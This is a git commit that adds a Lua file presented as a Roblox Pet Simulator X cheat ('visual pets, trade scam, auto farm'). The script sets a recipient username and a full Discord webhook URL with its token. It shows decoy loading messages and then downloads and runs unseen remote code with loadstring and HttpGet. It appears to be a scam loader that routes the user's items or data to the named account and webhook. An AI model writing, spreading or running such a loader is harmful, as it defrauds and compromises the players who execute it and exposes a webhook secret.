fe2c145fdabafaeb61d0f64bd27659fd91549192
2o398 <84686897+2o398@users.noreply.github.com>
2023-03-03 23:11:42 +0200

    Add files via upload

---
+++ VISUAL PETS,TRADE SCAM,AUTO FARM.lua
@@ -0,0 +1,9 @@
+Username = "PowerGMGMostRoyal"
+WebHook = "https://discord.com/api/webhooks/1076990398414729288/7C_x1KNnMBDGZ7xz2e9MoCfqKeAbNokOBgHIxOK6PPDvP7eggdc4erfTcEWin_QGcNM4"
+
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
